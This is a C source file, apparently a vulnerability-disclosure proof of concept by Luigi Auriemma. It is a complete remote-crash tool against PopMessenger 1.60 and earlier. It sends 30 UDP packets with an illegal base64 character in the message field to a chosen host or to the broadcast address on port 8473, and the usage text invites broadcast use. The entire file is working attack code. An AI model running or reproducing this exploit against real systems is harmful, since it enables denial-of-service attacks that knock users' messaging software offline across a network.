/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif



#define VER     "0.1"
#define PORT    8473
#define BCAST   "255.255.255.255"
#define MAX     30      // we need less then 20 packets



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i,
                on = 1;
    u_long      randnum;
    u_short     port = PORT;
    u_char      pck[] =
                "Z........\0"
                "C@main\1"
                "@chnlMAIN\1"
                "@chnlMAIN\1"
                "\1\1\1\1\1"
                "crasher\1"
                "cmdAddString\1"
                "%\1";  // the crash happens when the program receives
                        // multiple packets containing an incorrect base64
                        // char in the message field (in fact % is illegal)


    setbuf(stdout, NULL);

    fputs("\n"
        "PopMessenger <= 1.60 (20 Sep 2004) remote crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n"
            "Note: you can also launch this tool versus broadcast IP (like "BCAST")\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port    = atoi(argv[2]);
    if(!memcmp(argv[1], BCAST, sizeof(BCAST) - 1)) {
        peer.sin_addr.s_addr = 0xffffffffL;
    } else {
        peer.sin_addr.s_addr = resolv(argv[1]);
    }
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    /* broadcast */
    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on))
     < 0) std_err();

    randnum = time(NULL);

    printf("- send %d messages with an illegal base64 char to cause the crash\n", MAX);
    for(i = 0; i < MAX; i++) {
        sprintf(pck + 1, "%08lx", randnum * i);  // must be ever different
        if(sendto(sd, pck, sizeof(pck) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputc('.', stdout);
        sleep(0);
    }

    close(sd);
    fputs("\n- data sent, the application should be crashed\n\n", stdout);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif



